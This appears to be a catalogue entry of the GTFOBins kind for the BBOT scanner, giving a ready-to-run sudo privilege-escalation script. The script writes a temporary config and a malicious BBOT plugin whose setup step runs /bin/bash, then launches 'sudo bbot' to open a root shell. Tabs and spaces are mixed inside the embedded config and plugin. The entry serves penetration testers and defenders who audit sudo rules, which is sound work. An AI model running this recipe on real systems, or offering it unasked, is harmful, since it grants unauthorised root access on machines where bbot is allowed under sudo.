---
functions:
  sudo:
	- description: This command creates a couple of malicious YML config files and BBOT plugins, then inits BBOT and triggers the malicious plugin.
	  code: |
		TEMP_YMLCONF=$(mktemp /tmp/XXXXXXXX.yml)
		TEMP_PLUGINDIR=$(mktemp -d /tmp/XXXXXXXX)
		TEMP_PLUGIN=$TEMP_PLUGINDIR/init_userbash.py
		TEMP_OUTDIR=$(mktemp -d /tmp/XXXXXXXX)
		PLUGIN_NAME=init_userbash
		cat << EOF > $TEMP_YMLCONF
		targets: localhost
        output_dir: $TEMP_OUTDIR
        module_dirs: $TEMP_PLUGINDIR
		EOF
		cat << EOF > $TEMP_PLUGIN
		import os
        from bbot.modules.base import BaseModule
        class init_userbash(BaseModule):
	        async def setup(self):
		        self.hugeinfo(f"[*] Starting a new user shell ......")
		        os.system("/bin/bash")
		    async def handle_event(self, event):
		        self.hugeinfo(f"[*] Exiting shell ......")
		EOF
		sudo bbot -p $TEMP_YMLCONF -m $PLUGIN_NAME -t localhost
---